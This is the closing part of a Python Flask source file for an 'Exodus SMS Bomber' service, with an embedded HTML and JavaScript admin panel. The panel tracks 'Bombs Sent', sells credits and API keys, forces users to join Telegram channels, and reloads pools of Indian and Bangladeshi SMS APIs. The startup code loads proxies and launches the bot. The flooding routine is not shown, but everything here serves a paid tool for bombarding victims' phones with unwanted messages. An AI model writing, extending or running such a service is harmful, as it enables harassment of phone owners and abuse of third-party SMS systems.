  .badge{display:inline-flex;align-items:center;gap:.35rem;padding:.25rem .625rem;border-radius:.375rem;font-size:.7rem;font-weight:700;font-family:'JetBrains Mono',monospace;text-transform:uppercase;letter-spacing:.08em;border:1px solid transparent}
  .badge-active{background:rgba(34,197,94,.12);color:var(--green);border-color:rgba(34,197,94,.25)}
  .badge-banned{background:rgba(239,68,68,.12);color:var(--red);border-color:rgba(239,68,68,.25)}
  .badge-paused{background:rgba(245,158,11,.12);color:var(--amber);border-color:rgba(245,158,11,.25)}
  .table-wrap{overflow-x:auto}
  table{width:100%;border-collapse:collapse}
  th{padding:.875rem 1.25rem;text-align:left;font-size:.7rem;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:.1em;font-family:'JetBrains Mono',monospace;border-bottom:1px solid var(--border);background:rgba(255,255,255,.02)}
  td{padding:.875rem 1.25rem;font-size:.85rem;border-bottom:1px solid rgba(255,255,255,.04);vertical-align:middle}
  tr:last-child td{border-bottom:none}
  tr:hover td{background:rgba(255,255,255,.02)}
  .btn{display:inline-flex;align-items:center;gap:.4rem;padding:.4rem .75rem;border-radius:.5rem;font-size:.78rem;font-weight:600;cursor:pointer;transition:all .15s;border:1px solid transparent;font-family:inherit}
  .btn-sm{padding:.3rem .6rem;font-size:.72rem}
  .btn-violet{background:rgba(139,92,246,.15);color:var(--violet);border-color:rgba(139,92,246,.3)}
  .btn-violet:hover{background:rgba(139,92,246,.25)}
  .btn-green{background:rgba(34,197,94,.15);color:var(--green);border-color:rgba(34,197,94,.3)}
  .btn-green:hover{background:rgba(34,197,94,.25)}
  .btn-red{background:rgba(239,68,68,.15);color:var(--red);border-color:rgba(239,68,68,.3)}
  .btn-red:hover{background:rgba(239,68,68,.25)}
  .btn-cyan{background:rgba(6,182,212,.15);color:var(--cyan);border-color:rgba(6,182,212,.3)}
  .btn-cyan:hover{background:rgba(6,182,212,.25)}
  .btn-amber{background:rgba(245,158,11,.15);color:var(--amber);border-color:rgba(245,158,11,.25)}
  .btn-amber:hover{background:rgba(245,158,11,.25)}
  .btn-full{width:100%;justify-content:center;padding:.75rem;font-size:.85rem}
  .modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);backdrop-filter:blur(8px);z-index:1000;align-items:center;justify-content:center;padding:1rem}
  .modal-overlay.open{display:flex}
  .modal{background:var(--bg2);border:1px solid rgba(255,255,255,.1);border-radius:1.25rem;width:100%;max-width:480px;overflow:hidden;box-shadow:0 25px 50px rgba(0,0,0,.8);animation:slideUp .3s ease}
  .modal-header{padding:1.25rem 1.5rem;border-bottom:1px solid var(--border);background:rgba(255,255,255,.02)}
  .modal-title{font-weight:800;text-transform:uppercase;letter-spacing:.08em;font-size:1rem;background:linear-gradient(90deg,var(--violet),var(--cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
  .modal-body{padding:1.5rem}
  .modal-footer{padding:1rem 1.5rem;border-top:1px solid var(--border);display:flex;gap:.75rem;justify-content:flex-end}
  .field{margin-bottom:1rem}
  .field label{display:block;font-size:.72rem;color:var(--muted);font-family:'JetBrains Mono',monospace;text-transform:uppercase;letter-spacing:.1em;margin-bottom:.4rem}
  .field input,.field textarea{width:100%;background:rgba(0,0,0,.4);border:1px solid rgba(255,255,255,.1);border-radius:.625rem;padding:.65rem .875rem;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:.8rem;outline:none;transition:border-color .2s;resize:vertical}
  .field input:focus,.field textarea:focus{border-color:var(--violet);box-shadow:0 0 0 2px rgba(139,92,246,.15)}
  .field-row{display:grid;grid-template-columns:1fr 1fr;gap:.75rem}
  .section-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:1rem;flex-wrap:wrap;gap:.75rem}
  .actions-bar{display:flex;gap:.5rem;flex-wrap:wrap}
  .text-mono{font-family:'JetBrains Mono',monospace}
  .text-muted{color:var(--muted)}
  .text-xs{font-size:.72rem}
  .empty-state{padding:3rem;text-align:center;color:var(--muted);font-family:'JetBrains Mono',monospace;font-size:.75rem;text-transform:uppercase;letter-spacing:.1em}
  .toast-container{position:fixed;bottom:1.5rem;right:1.5rem;z-index:9999;display:flex;flex-direction:column;gap:.5rem}
  .toast{padding:.75rem 1.25rem;border-radius:.625rem;font-size:.82rem;font-weight:600;animation:slideUp .3s ease;max-width:300px;border:1px solid transparent}
  .toast-success{background:rgba(34,197,94,.15);color:var(--green);border-color:rgba(34,197,94,.3)}
  .toast-error{background:rgba(239,68,68,.15);color:var(--red);border-color:rgba(239,68,68,.3)}
  .refresh-indicator{display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--cyan);animation:pulse 1s infinite;margin-left:.5rem}
  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
  @media (max-width:640px){.sidebar{width:56px}.sidebar-logo-text,.sidebar-sub,.nav-item span{display:none}.nav-item{justify-content:center}.page{padding:1rem}}
</style>
</head>
<body>
<div class="bubbles" id="bubbles"></div>

<div class="login-wrap" id="loginScreen">
  <div class="login-card">
    <div class="login-icon">🔐</div>
    <div class="login-title">Exodus Admin</div>
    <div class="login-sub">SECURE TERMINAL ACCESS</div>
    <form id="loginForm">
      <div class="form-group">
        <input class="form-input" type="password" id="passwordInput" placeholder="Enter access code" autocomplete="off">
      </div>
      <button class="btn-primary" type="submit" id="loginBtn">INITIALIZE</button>
      <div class="err-msg" id="loginErr" style="display:none"></div>
    </form>
  </div>
</div>

<div class="app" id="mainApp">
  <nav class="sidebar">
    <div class="sidebar-logo">
      <div class="sidebar-logo-text">Exodus Admin</div>
      <div class="sidebar-sub">SMS BOMBER</div>
    </div>
    <div class="sidebar-nav">
      <button class="nav-item active" onclick="showPage('dashboard')" id="nav-dashboard"><span class="nav-icon">📊</span><span>Dashboard</span></button>
      <button class="nav-item" onclick="showPage('users')" id="nav-users"><span class="nav-icon">👥</span><span>Users</span></button>
      <button class="nav-item" onclick="showPage('keys')" id="nav-keys"><span class="nav-icon">🔑</span><span>API Keys</span></button>
      <button class="nav-item" onclick="showPage('channels')" id="nav-channels"><span class="nav-icon">📢</span><span>Channels</span></button>
      <button class="nav-item" onclick="showPage('gift')" id="nav-gift"><span class="nav-icon">🎟️</span><span>Gift Codes</span></button>
      <button class="nav-item" onclick="showPage('settings')" id="nav-settings"><span class="nav-icon">⚙️</span><span>Settings</span></button>
    </div>
    <div class="sidebar-footer">
      <button class="btn-logout" onclick="logout()"><span class="nav-icon">🚪</span><span>Logout</span></button>
    </div>
  </nav>

  <main class="main">
    <div class="page active" id="page-dashboard">
      <div class="page-header">
        <div class="page-title">Dashboard</div>
        <div class="page-sub">LIVE STATS <span class="refresh-indicator"></span></div>
      </div>
      <div class="stat-grid" id="statGrid"></div>
      <div class="glass" style="margin-top:1rem">
        <div class="section-header" style="padding:1.25rem 1.25rem 0">
          <div style="font-weight:700;font-size:.9rem;">Quick Actions</div>
          <div class="actions-bar">
            <button class="btn btn-cyan" onclick="reloadApis()">🔄 Reload APIs</button>
          </div>
        </div>
        <div class="table-wrap">
          <table>
            <thead><tr><th>User</th><th>Credits</th><th>Refs</th><th>Bombs</th><th>Status</th><th>Actions</th></tr></thead>
            <tbody id="userTable"><tr><td colspan="6" class="empty-state">Loading...</td></tr></tbody>
          </table>
        </div>
      </div>
    </div>

    <div class="page" id="page-users">
      <div class="page-header">
        <div class="page-title">Users</div>
        <div class="page-sub">MANAGE ALL BOT USERS</div>
      </div>
      <div class="section-header">
        <div class="actions-bar">
          <button class="btn btn-cyan" onclick="openExport()">💾 Export</button>
          <button class="btn btn-amber" onclick="openImport()">📥 Import</button>
        </div>
        <div class="actions-bar">
          <input id="userSearch" placeholder="Search by ID or username..." style="background:rgba(0,0,0,.4);border:1px solid rgba(255,255,255,.1);border-radius:.625rem;padding:.5rem .875rem;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:.8rem;outline:none;width:240px" oninput="renderUsers()">
        </div>
      </div>
      <div class="glass" style="margin-top:1rem">
        <div class="table-wrap">
          <table>
            <thead><tr><th>User</th><th>Credits</th><th>Refs</th><th>Bombs</th><th>Premium</th><th>Status</th><th>Actions</th></tr></thead>
            <tbody id="fullUserTable"><tr><td colspan="7" class="empty-state">Loading...</td></tr></tbody>
          </table>
        </div>
      </div>
    </div>

    <div class="page" id="page-keys">
      <div class="page-header">
        <div class="page-title">API Keys</div>
        <div class="page-sub">GENERATE AND REVOKE KEYS</div>
      </div>
      <div class="section-header">
        <div class="actions-bar">
          <button class="btn btn-green" onclick="openAddKey()">➕ Generate Key</button>
        </div>
      </div>
      <div class="glass" style="margin-top:1rem">
        <div class="table-wrap">
          <table>
            <thead><tr><th>Key</th><th>User ID</th><th>Plan</th><th>Expires</th><th>Status</th><th>Actions</th></tr></thead>
            <tbody id="keyTable"><tr><td colspan="6" class="empty-state">Loading...</td></tr></tbody>
          </table>
        </div>
      </div>
    </div>

    <div class="page" id="page-channels">
      <div class="page-header">
        <div class="page-title">Force-Join Channels</div>
        <div class="page-sub">MUST-JOIN CHANNELS</div>
      </div>
      <div class="section-header">
        <div class="actions-bar">
          <button class="btn btn-green" onclick="openAddChannel()">➕ Add Channel</button>
        </div>
      </div>
      <div class="glass" style="margin-top:1rem">
        <div class="table-wrap">
          <table>
            <thead><tr><th>Title</th><th>Chat ID</th><th>Link</th><th>Added</th><th>Actions</th></tr></thead>
            <tbody id="channelTable"><tr><td colspan="5" class="empty-state">Loading...</td></tr></tbody>
          </table>
        </div>
      </div>
    </div>

    <div class="page" id="page-gift">
      <div class="page-header">
        <div class="page-title">Gift Codes</div>
        <div class="page-sub">CREATE AND MANAGE REDEEM CODES</div>
      </div>
      <div class="section-header">
        <div class="actions-bar">
          <button class="btn btn-green" onclick="openAddGift()">➕ Create Gift Code</button>
        </div>
      </div>
      <div class="glass" style="margin-top:1rem">
        <div class="table-wrap">
          <table>
            <thead><tr><th>Code</th><th>Credits</th><th>Max Users</th><th>Claimed</th><th>Expires</th><th>Actions</th></tr></thead>
            <tbody id="giftTable"><tr><td colspan="6" class="empty-state">Loading...</td></tr></tbody>
          </table>
        </div>
      </div>
    </div>

    <div class="page" id="page-settings">
      <div class="page-header">
        <div class="page-title">Settings</div>
        <div class="page-sub">BOT CONFIGURATION</div>
      </div>
      <div class="glass" style="padding:1.5rem;max-width:600px">
        <div class="field">
          <label>Daily API Limit per Key</label>
          <input id="setDailyLimit" type="number" min="1" placeholder="500">
        </div>
        <button class="btn btn-violet btn-full" onclick="saveSettings()">Save Settings</button>
      </div>
    </div>
  </main>
</div>

<div class="modal-overlay" id="modal">
  <div class="modal">
    <div class="modal-header"><div class="modal-title" id="modalTitle">Modal</div></div>
    <div class="modal-body" id="modalBody"></div>
    <div class="modal-footer">
      <button class="btn" onclick="closeModal()">Cancel</button>
      <button class="btn btn-violet" id="modalConfirm" onclick="modalAction()">Confirm</button>
    </div>
  </div>
</div>

<div class="toast-container" id="toastContainer"></div>

<script>
const TOKEN_KEY='Exodus_admin_token';
let token=localStorage.getItem(TOKEN_KEY)||'';
let refreshTimer=null;
let currentPage='dashboard';
let _allUsers=[];
let _modalType=null;

(function(){const colors=['#8b5cf6','#06b6d4','#ec4899','#22c55e','#f59e0b'];const wrap=document.getElementById('bubbles');for(let i=0;i<28;i++){const b=document.createElement('div');b.className='bubble';const sz=Math.random()*60+20;b.style.cssText=`width:${sz}px;height:${sz}px;left:${Math.random()*100}%;background:${colors[Math.floor(Math.random()*colors.length)]};animation-duration:${Math.random()*15+10}s;animation-delay:${Math.random()*-20}s`;wrap.appendChild(b);}})();

async function apiCall(method,path,body){
  const opts={method,headers:{'X-Admin-Token':token,'Content-Type':'application/json'}};
  if(body)opts.body=JSON.stringify(body);
  const r=await fetch(path,opts);
  if(r.status===401){logout();throw new Error('Unauthorized');}
  return r.json();
}
function toast(msg,type='success'){const t=document.createElement('div');t.className=`toast toast-${type}`;t.textContent=msg;document.getElementById('toastContainer').appendChild(t);setTimeout(()=>t.remove(),3500);}
function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
function timeAgo(ts){const d=Math.floor((Date.now()/1000)-ts);if(d<60)return d+'s ago';if(d<3600)return Math.floor(d/60)+'m ago';if(d<86400)return Math.floor(d/3600)+'h ago';return Math.floor(d/86400)+'d ago';}

if(token)showApp();

document.getElementById('loginForm').addEventListener('submit',async e=>{
  e.preventDefault();
  const pw=document.getElementById('passwordInput').value;
  const btn=document.getElementById('loginBtn');
  btn.disabled=true;btn.textContent='AUTHENTICATING...';
  document.getElementById('loginErr').style.display='none';
  try{
    const r=await fetch('/admin/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:pw})});
    const d=await r.json();
    if(!r.ok)throw new Error(d.error||'Access denied');
    token=d.token;localStorage.setItem(TOKEN_KEY,token);showApp();
  }catch(e){
    const el=document.getElementById('loginErr');el.textContent=e.message;el.style.display='block';
    document.getElementById('passwordInput').value='';
  }finally{btn.disabled=false;btn.textContent='INITIALIZE';}
});

function showApp(){document.getElementById('loginScreen').style.display='none';document.getElementById('mainApp').classList.add('visible');startRefresh();}
function logout(){localStorage.removeItem(TOKEN_KEY);token='';stopRefresh();document.getElementById('mainApp').classList.remove('visible');document.getElementById('loginScreen').style.display='flex';}
function showPage(name){document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));document.getElementById('page-'+name).classList.add('active');document.getElementById('nav-'+name).classList.add('active');currentPage=name;refresh();}
function startRefresh(){refresh();refreshTimer=setInterval(refresh,5000);}
function stopRefresh(){if(refreshTimer)clearInterval(refreshTimer);}

async function refresh(){
  try{
    if(currentPage==='dashboard')await renderDashboard();
    else if(currentPage==='users')await renderUsers();
    else if(currentPage==='keys')await renderKeys();
    else if(currentPage==='channels')await renderChannels();
    else if(currentPage==='gift')await renderGifts();
    else if(currentPage==='settings')await renderSettings();
  }catch(e){}
}

async function renderDashboard(){
  const s=await apiCall('GET','/admin/api/stats');
  const stats=[
    {label:'Users',value:s.users,color:'var(--violet)',icon:'👥'},
    {label:'Banned',value:s.banned,color:'var(--red)',icon:'🚫'},
    {label:'Active Keys',value:s.keys,color:'var(--green)',icon:'🔑'},
    {label:'Bombs Sent',value:s.bombs,color:'var(--cyan)',icon:'💣'},
    {label:'Channels',value:s.channels,color:'var(--amber)',icon:'📢'},
    {label:'India APIs',value:s.india_apis,color:'var(--pink)',icon:'🇮🇳'},
    {label:'BD APIs',value:s.bd_apis,color:'var(--blue)',icon:'🇧🇩'},
    {label:'Premium',value:s.premium,color:'var(--violet)',icon:'💎'},
  ];
  document.getElementById('statGrid').innerHTML=stats.map(st=>`<div class="glass stat-card"><div class="stat-card-icon">${st.icon}</div><div class="stat-card-value" style="color:${st.color}">${st.value}</div><div class="stat-card-label">${st.label}</div></div>`).join('');
  _allUsers=await apiCall('GET','/admin/api/users');
  document.getElementById('userTable').innerHTML=_allUsers.slice(0,10).length?_allUsers.slice(0,10).map(u=>`<tr>
    <td><b>${esc(u.first_name||'-')}</b>${u.username?`<div class="text-xs text-muted text-mono">@${esc(u.username)}</div>`:''}<div class="text-xs text-muted text-mono">ID: ${u.id}</div></td>
    <td class="text-mono">${u.credits||0}</td><td class="text-mono">${u.total_refs||0}</td><td class="text-mono">${u.total_bombs||0}</td>
    <td>${u.banned?'<span class="badge badge-banned">Banned</span>':'<span class="badge badge-active">Active</span>'}</td>
    <td><div style="display:flex;gap:.375rem;flex-wrap:wrap">
      ${u.banned?`<button class="btn btn-sm btn-green" onclick="unbanUser('${u.id}')">✅ Unban</button>`:`<button class="btn btn-sm btn-red" onclick="banUser('${u.id}')">🚫 Ban</button>`}
      <button class="btn btn-sm btn-cyan" onclick="addCredits('${u.id}')">💰</button>
    </div></td></tr>`).join(''):'<tr><td colspan="6" class="empty-state">No users yet</td></tr>';
}

async function renderUsers(){
  try{
    _allUsers=await apiCall('GET','/admin/api/users');
    const q=(document.getElementById('userSearch').value||'').toLowerCase();
    const filtered=_allUsers.filter(u=>!q||String(u.id).includes(q)||(u.username||'').toLowerCase().includes(q)||(u.first_name||'').toLowerCase().includes(q));
    document.getElementById('fullUserTable').innerHTML=filtered.length?filtered.map(u=>`<tr>
      <td><b>${esc(u.first_name||'-')}</b>${u.username?`<div class="text-xs text-muted text-mono">@${esc(u.username)}</div>`:''}<div class="text-xs text-muted text-mono">ID: ${u.id}</div></td>
      <td class="text-mono">${u.credits||0}</td><td class="text-mono">${u.total_refs||0}</td><td class="text-mono">${u.total_bombs||0}</td>
      <td>${u.is_premium?'<span class="badge badge-active">💎 Yes</span>':'<span class="badge badge-paused">❌ No</span>'}</td>
      <td>${u.banned?'<span class="badge badge-banned">Banned</span>':'<span class="badge badge-active">Active</span>'}</td>
      <td><div style="display:flex;gap:.375rem;flex-wrap:wrap">
        ${u.banned?`<button class="btn btn-sm btn-green" onclick="unbanUser('${u.id}')">✅ Unban</button>`:`<button class="btn btn-sm btn-red" onclick="banUser('${u.id}')">🚫 Ban</button>`}
        <button class="btn btn-sm btn-cyan" onclick="addCredits('${u.id}')">💰 Credits</button>
        <button class="btn btn-sm btn-violet" onclick="grantKey('${u.id}')">🔑 Key</button>
        <button class="btn btn-sm btn-amber" onclick="togglePremium('${u.id}',${!u.is_premium})">${u.is_premium?'🔓':'💎'} Premium</button>
      </div></td></tr>`).join(''):'<tr><td colspan="7" class="empty-state">No users found</td></tr>';
  }catch(e){}
}

async function renderKeys(){
  try{
    const keys=await apiCall('GET','/admin/api/keys');
    document.getElementById('keyTable').innerHTML=keys.length?keys.map(k=>{
      const exp=k.expires_at*1000;const expired=exp<Date.now();
      return `<tr><td class="text-mono text-xs">${esc(k.key)}</td><td class="text-mono">${k.user_id}</td><td>${esc(k.plan||'-')}</td>
        <td class="text-mono text-xs">${new Date(exp).toLocaleString()}</td>
        <td>${k.revoked?'<span class="badge badge-banned">Revoked</span>':(expired?'<span class="badge badge-paused">Expired</span>':'<span class="badge badge-active">Active</span>')}</td>
        <td>${!k.revoked?`<button class="btn btn-sm btn-red" onclick="revokeKey('${k.key}')">🗑 Revoke</button>`:'-'}</td></tr>`;
    }).join(''):'<tr><td colspan="6" class="empty-state">No keys</td></tr>';
  }catch(e){}
}

async function renderChannels(){
  try{
    const chans=await apiCall('GET','/admin/api/channels');
    document.getElementById('channelTable').innerHTML=chans.length?chans.map(c=>`<tr>
      <td><b>${esc(c.title||'-')}</b></td><td class="text-mono text-xs">${esc(c.chat_id)}</td>
      <td class="text-xs"><a href="${esc(c.link)}" target="_blank" style="color:var(--cyan)">${esc(c.link)}</a></td>
      <td class="text-xs text-muted">${new Date((c.added_at||0)*1000).toLocaleDateString()}</td>
      <td><button class="btn btn-sm btn-red" onclick="delChannel('${esc(c.chat_id)}')">🗑 Remove</button></td></tr>`).join(''):'<tr><td colspan="5" class="empty-state">No channels</td></tr>';
  }catch(e){}
}

async function renderGifts(){
  try{
    const gifts=await apiCall('GET','/admin/api/gift');
    document.getElementById('giftTable').innerHTML=gifts.length?gifts.map(g=>`<tr>
      <td class="text-mono text-xs">${esc(g.code)}</td><td class="text-mono">${g.credits}</td>
      <td class="text-mono">${g.max_users||'∞'}</td><td class="text-mono">${g.claimed_count||0}</td>
      <td class="text-xs">${g.expires_at?new Date(g.expires_at*1000).toLocaleDateString():'No expiry'}</td>
      <td><button class="btn btn-sm btn-red" onclick="delGift('${esc(g.code)}')">🗑 Delete</button></td></tr>`).join(''):'<tr><td colspan="6" class="empty-state">No gift codes</td></tr>';
  }catch(e){}
}

async function renderSettings(){
  try{
    const s=await apiCall('GET','/admin/api/settings');
    document.getElementById('setDailyLimit').value=s.daily_limit||500;
  }catch(e){}
}

async function saveSettings(){
  try{
    const limit=parseInt(document.getElementById('setDailyLimit').value)||500;
    await apiCall('POST','/admin/api/settings',{daily_limit:limit});
    toast('Settings saved','success');
  }catch(e){toast(e.message,'error');}
}

async function banUser(id){try{await apiCall('POST',`/admin/api/users/${id}/ban`);toast('User banned','success');refresh();}catch(e){toast(e.message,'error');}}
async function unbanUser(id){try{await apiCall('POST',`/admin/api/users/${id}/unban`);toast('User unbanned','success');refresh();}catch(e){toast(e.message,'error');}}
async function togglePremium(id,v){try{await apiCall('POST',`/admin/api/users/${id}/premium`,{premium:v});toast('Premium updated','success');refresh();}catch(e){toast(e.message,'error');}}
async function delChannel(id){if(!confirm('Remove this channel?'))return;try{await apiCall('DELETE',`/admin/api/channels/${id}`);toast('Channel removed','success');refresh();}catch(e){toast(e.message,'error');}}
async function delGift(code){if(!confirm('Delete this gift code?'))return;try{await apiCall('DELETE',`/admin/api/gift/${code}`);toast('Gift code deleted','success');refresh();}catch(e){toast(e.message,'error');}}
async function revokeKey(key){if(!confirm('Revoke this key?'))return;try{await apiCall('DELETE',`/admin/api/keys/${key}`);toast('Key revoked','success');refresh();}catch(e){toast(e.message,'error');}}
async function reloadApis(){try{const r=await apiCall('POST','/admin/api/reload-apis');toast(`Reloaded: ${r.india} India, ${r.bd} BD APIs`,'success');refresh();}catch(e){toast(e.message,'error');}}

function openModal(title,bodyHtml,type,action){
  document.getElementById('modalTitle').textContent=title;
  document.getElementById('modalBody').innerHTML=bodyHtml;
  document.getElementById('modal').classList.add('open');
  _modalType=type;
  document.getElementById('modalConfirm').onclick=action||modalAction;
}
function closeModal(){document.getElementById('modal').classList.remove('open');_modalType=null;}

function openAddKey(){
  openModal('Generate API Key',`
    <div class="field"><label>User ID</label><input id="keyUserId" type="number" placeholder="123456789"></div>
    <div class="field"><label>Days Valid</label><input id="keyDays" type="number" min="1" value="30"></div>
  `,'addKey',async()=>{
    const uid=document.getElementById('keyUserId').value.trim();
    const days=parseInt(document.getElementById('keyDays').value);
    if(!uid||!days)return toast('Fill all fields','error');
    try{const r=await apiCall('POST','/admin/api/keys',{user_id:uid,days});toast('Key: '+r.key,'success');closeModal();refresh();}catch(e){toast(e.message,'error');}
  });
}

function openAddChannel(){
  openModal('Add Force-Join Channel',`
    <div class="field"><label>Chat ID (@username or -100ID)</label><input id="chanChatId" placeholder="@channel or -100123..."></div>
    <div class="field"><label>Title (optional)</label><input id="chanTitle" placeholder="My Channel"></div>
    <div class="field"><label>Invite Link (optional)</label><input id="chanLink" placeholder="https://t.me/..."></div>
  `,'addChannel',async()=>{
    const chat_id=document.getElementById('chanChatId').value.trim();
    const title=document.getElementById('chanTitle').value.trim();
    const link=document.getElementById('chanLink').value.trim();
    if(!chat_id)return toast('Chat ID required','error');
    try{await apiCall('POST','/admin/api/channels',{chat_id,title,link});toast('Channel added','success');closeModal();refresh();}catch(e){toast(e.message,'error');}
  });
}

function openAddGift(){
  openModal('Create Gift Code',`
    <div class="field"><label>Credits</label><input id="giftCredits" type="number" min="1" placeholder="50"></div>
    <div class="field"><label>Max Users (0 = unlimited)</label><input id="giftMax" type="number" min="0" value="100"></div>
    <div class="field"><label>Days Valid (0 = no expiry)</label><input id="giftDays" type="number" min="0" value="7"></div>
  `,'addGift',async()=>{
    const credits=parseInt(document.getElementById('giftCredits').value);
    const max_users=parseInt(document.getElementById('giftMax').value)||0;
    const days_valid=parseInt(document.getElementById('giftDays').value)||0;
    if(!credits)return toast('Credits required','error');
    try{const r=await apiCall('POST','/admin/api/gift',{credits,max_users,days_valid});toast('Code: '+r.code,'success');closeModal();refresh();}catch(e){toast(e.message,'error');}
  });
}

function addCredits(uid){
  openModal('Add Credits',`
    <div class="field"><label>Amount</label><input id="creditAmount" type="number" min="1" placeholder="10"></div>
  `,'addCredits',async()=>{
    const amount=parseInt(document.getElementById('creditAmount').value);
    if(!amount)return toast('Amount required','error');
    try{await apiCall('POST',`/admin/api/users/${uid}/credits`,{amount});toast(`+${amount} credits`,'success');closeModal();refresh();}catch(e){toast(e.message,'error');}
  });
}

function grantKey(uid){
  openModal('Grant API Key',`
    <div class="field"><label>Days Valid</label><input id="grantDays" type="number" min="1" value="30"></div>
  `,'grantKey',async()=>{
    const days=parseInt(document.getElementById('grantDays').value);
    if(!days)return toast('Days required','error');
    try{const r=await apiCall('POST','/admin/api/keys',{user_id:uid,days});toast('Key: '+r.key,'success');closeModal();refresh();}catch(e){toast(e.message,'error');}
  });
}

function openExport(){
  openModal('Export Database',`<p class="text-muted" style="margin-bottom:1rem">Download all users, keys, gift codes, and channels as JSON.</p>`,'export',async()=>{
    try{const data=await apiCall('GET','/admin/api/export');const blob=new Blob([JSON.stringify(data,null,2)],{type:'application/json'});const url=URL.createObjectURL(blob);const a=document.createElement('a');a.href=url;a.download=`exodus_export_${Date.now()}.json`;a.click();URL.revokeObjectURL(url);toast('Export downloaded','success');closeModal();}catch(e){toast(e.message,'error');}
  });
}

function openImport(){
  openModal('Import Database',`
    <div class="field"><label>Paste JSON data</label><textarea id="importData" rows="8" placeholder='{"users":[...],"keys":[...],...}'></textarea></div>
  `,'import',async()=>{
    try{const raw=document.getElementById('importData').value;const data=JSON.parse(raw);const r=await apiCall('POST','/admin/api/import',data);toast(`Imported: ${r.imported.users} users, ${r.imported.keys} keys`,'success');closeModal();refresh();}catch(e){toast('Import failed: '+e.message,'error');}
  });
}

document.querySelectorAll('.modal-overlay').forEach(el=>{el.addEventListener('click',e=>{if(e.target===el)closeModal();});});
</script>
</body>
</html>"""

# ═══════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════
def main():
    load_proxies()
    load_apis()
    print(f"""
{'='*56}
  ✅ EXODUS SMS BOMBER API STARTED
  🌐 Home:     {BASE_URL}/
  📊 Admin:    {BASE_URL}/admin
  🔑 Password: {ADMIN_PASSWORD}
  🇮🇳 India:   {len(_apis['india'])} APIs
  🇧🇩 BD:      {len(_apis['bangladesh'])} APIs
  🔥 Firebase: {'✅' if _db else '❌'}
  👨‍💻 Developer: {DEVELOPER}
{'='*56}
""")
    
    import botsys
    botsys.start_bot(PORT)

    app.run(host="0.0.0.0", port=PORT, debug=False, threaded=True)

if __name__ == "__main__":
    main()